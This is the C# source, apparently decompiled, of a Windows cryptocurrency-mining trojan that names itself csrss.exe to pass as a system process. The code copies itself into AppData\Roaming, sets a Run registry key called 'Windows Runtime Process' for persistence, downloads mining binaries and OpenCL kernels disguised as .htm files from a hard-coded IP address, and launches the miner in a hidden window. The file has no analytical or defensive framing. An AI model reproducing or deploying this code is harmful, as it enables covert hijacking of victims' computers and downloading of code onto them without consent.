using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace csrss;

internal class Program
{
	public static string serverURI = "http://46.105.125.82/ccc/";

	public static string finalName = "csrss.exe";

	public static string finalNameWorker = "svs32.exe";

	public static string finalNameWorker2 = "svs32-rpc.exe";

	public static string finalPath = "\\AppData\\Roaming";

	public static bool continueRunning = true;

	public static string username = "";

	public static List<KeyValuePair<string, string>> fileList;

	private static void Main(string[] args)
	{
		fileList = new List<KeyValuePair<string, string>>();
		fileList.Add(new KeyValuePair<string, string>("ccc.htm", finalNameWorker));
		fileList.Add(new KeyValuePair<string, string>("ccc-rpc.htm", finalNameWorker2));
		fileList.Add(new KeyValuePair<string, string>("config.htm", "config.conf"));
		fileList.Add(new KeyValuePair<string, string>("diablo121016.htm", "diablo121016.cl"));
		fileList.Add(new KeyValuePair<string, string>("diakgcn121016.htm", "diakgcn121016.cl"));
		fileList.Add(new KeyValuePair<string, string>("libblkmaker_jansson-0.1-0.htm", "libblkmaker_jansson-0.1-0.dll"));
		fileList.Add(new KeyValuePair<string, string>("libblkmaker-0.1-0.htm", "libblkmaker-0.1-0.dll"));
		fileList.Add(new KeyValuePair<string, string>("libcurl-4.htm", "libcurl-4.dll"));
		fileList.Add(new KeyValuePair<string, string>("libjansson-4.htm", "libjansson-4.dll"));
		fileList.Add(new KeyValuePair<string, string>("libusb-1.0.htm", "libusb-1.0.dll"));
		fileList.Add(new KeyValuePair<string, string>("pdcurses.htm", "pdcurses.dll"));
		fileList.Add(new KeyValuePair<string, string>("phatk121016.htm", "phatk121016.cl"));
		fileList.Add(new KeyValuePair<string, string>("poclbm121016.htm", "poclbm121016.cl"));
		fileList.Add(new KeyValuePair<string, string>("poclbm121016ATI RV770v2w128l4.htm", "poclbm121016ATI RV770v2w128l4.bin"));
		fileList.Add(new KeyValuePair<string, string>("pthreadGC2.htm", "pthreadGC2.dll"));
		fileList.Add(new KeyValuePair<string, string>("zlib1.htm", "zlib1.dll"));
		installRegistryEntries();
		switch (copyItselfIntoAppData())
		{
		case -1:
			Environment.Exit(0);
			break;
		case 0:
		{
			Process process = new Process();
			process.StartInfo.FileName = "C:\\users\\" + username + finalPath + "\\" + finalName;
			process.StartInfo.WorkingDirectory = "C:\\users\\" + username + finalPath;
			process.StartInfo.UseShellExecute = true;
			process.Start();
			Environment.Exit(0);
			break;
		}
		}
		while (continueRunning)
		{
			installRegistryEntries();
			dlStuffIfNeeded();
			Thread.Sleep(256000);
			checkProcAndRun();
		}
	}

	private static bool checkProcAndRun()
	{
		Process[] processesByName = Process.GetProcessesByName(finalNameWorker.Replace(".exe", ""));
		if (processesByName.Length == 0)
		{
			Process process = new Process();
			process.StartInfo.FileName = "\"C:\\users\\" + username + finalPath + "\\" + finalNameWorker + "\"";
			process.StartInfo.WorkingDirectory = "C:\\users\\" + username + finalPath;
			process.StartInfo.Arguments = "-c \"C:\\users\\" + username + finalPath + "\\config.conf\"";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			return process.Start();
		}
		return true;
	}

	private static void dlStuffIfNeeded()
	{
		WebClient webClient = null;
		for (int i = 0; i < fileList.Count; i++)
		{
			if (!File.Exists("C:\\users\\" + username + finalPath + "\\" + fileList[i].Value))
			{
				webClient = new WebClient();
				webClient.DownloadFile(serverURI + fileList[i].Key, "C:\\users\\" + username + finalPath + "\\" + fileList[i].Value);
			}
		}
	}

	private static bool installRegistryEntries()
	{
		string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
		string[] valueNames = registryKey.GetValueNames();
		if (Array.Find(valueNames, (string s) => s == "Windows Runtime Process") == null)
		{
			username = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1];
			registryKey.SetValue("Windows Runtime Process", "\"C:\\users\\" + username + finalPath + "\\" + finalName + "\"");
		}
		registryKey.Close();
		return true;
	}

	private static int copyItselfIntoAppData()
	{
		username = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1];
		string directoryName = Path.GetDirectoryName(Assembly.GetExecutingAssembly().GetName().CodeBase);
		directoryName = directoryName.Replace("file://", "");
		directoryName = directoryName.Replace("file:\\", "");
		string fileName = Path.GetFileName(Assembly.GetExecutingAssembly().GetName().CodeBase);
		if (directoryName.IndexOf("C:\\users\\" + username + finalPath, StringComparison.OrdinalIgnoreCase) < 0 && directoryName.IndexOf("C:\\\\users\\\\" + username + "\\\\AppData\\\\Roaming", StringComparison.OrdinalIgnoreCase) < 0)
		{
			try
			{
				File.Copy(directoryName + "\\" + fileName, "C:\\users\\" + username + finalPath + "\\" + finalName);
				return 0;
			}
			catch (Exception ex)
			{
				ex.GetType();
				return -1;
			}
		}
		return 1;
	}
}
